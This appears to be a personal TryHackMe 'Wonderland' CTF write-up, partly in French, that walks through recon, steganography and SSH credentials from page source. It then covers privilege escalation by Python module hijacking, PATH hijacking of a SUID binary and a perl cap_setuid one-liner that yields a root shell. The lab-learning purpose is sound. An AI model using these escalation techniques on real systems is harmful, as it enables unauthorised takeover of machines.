#TryHackMe #linux 
# Scan Nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8eeefb96cead70dd05a93b0db071b863 (RSA)
|   256 7a927944164f204350a9a847e2c2be84 (ECDSA)
|_  256 000b8044e63d4b6947922c55147e2ac9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.


# Gobuster scan
/img                  (Status: 301) [Size: 0] [--> img/]

# Download rabbit img
┌──(root㉿kali)-[/home/kali/Desktop/THM/wonderland]
└─# wget http://thm/img/white_rabbit_1.jpg

# extract hide info on image
┌──(root㉿kali)-[/home/kali/Desktop/THM/wonderland]
└─# steghide extract -sf white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".

┌──(root㉿kali)-[/home/kali/Desktop/THM/wonderland]
└─# cat hint.txt                                     
follow the r a b b i t 

# view-source:http://thm/r/a/b/b/i/t/
alice:HowDothTheLittleCrocodileImproveHisShiningTail

# Foothold by ssh
## Find
### alice@wonderland:~$ ls -l
total 8
-rw------- 1 root root   66 May 25  2020 root.txt
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py

### alice@wonderland:~$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# Exploit for PrivEsc
## Usurpation du module random dans le programme "walrus_and_the_carpenter.py"
alice@wonderland:~$ touch random.py #ExploitNotAbsolutPath
alice@wonderland:~$ nano random.py
	import os
	os.system("/bin/bash")

## Exécution du programme
alice@wonderland:~$ sudo -u  rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

## shell de rabbit obtenu

## Find
### rabbit@wonderland:/home/rabbit$ ls -la
total 44
drwxr-x--- 2 rabbit rabbit  4096 Mar 13 22:41 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty (**Peut être exécuter avec les privilèges root par tous**)

### rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 14 Mar 2023 00:03:14 +0000
Ask very nicely, and I will give you some tea while you wait for him

### rabbit@wonderland:/home/rabbit$ cat teaParty
[...]
/bin/echo -n 'Probably by ' && date --date='next hour' -R 
[...]

## Usurpation du  chemin d'accès de la commande date

### rabbit@wonderland:/home/rabbit$ touch date #ExploitNotAbsolutPath 
### rabbit@wonderland:/home/rabbit$ nano date
#!/bin/bash
/bin/bash

### rabbit@wonderland:/home/rabbit$ chmod 777 date

### rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH #ExploitNotAbsolutPath

### rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

### rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by 
### hatter@wonderland:/home/rabbit$


## shell de hatter obtenu

## Find
### hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt

### hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?

## Connexion ssh à hatter

## Find
### ***Vérification des fichiers qui peuvent s'exécution avec privilège root***

### hatter@wonderland:~$ getcap -r / 2>/dev/null #ExploitCapability
**/usr/bin/perl5.26.1 = cap_setuid+ep**
/usr/bin/mtr-packet = cap_net_raw+ep
**/usr/bin/perl = cap_setuid+ep**

## Exploitation de /usr/bin/perl

### hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' (*commande trouvé sur GTFOBins*)

# Shell root obtenu
	# id
	uid=0(root) gid=1003(hatter) groups=1003(hatter)
## élevation de l'interface tty
	# python3 -c 'import pty; pty.spawn("/bin/bash")'                                    
	root@wonderland:~#

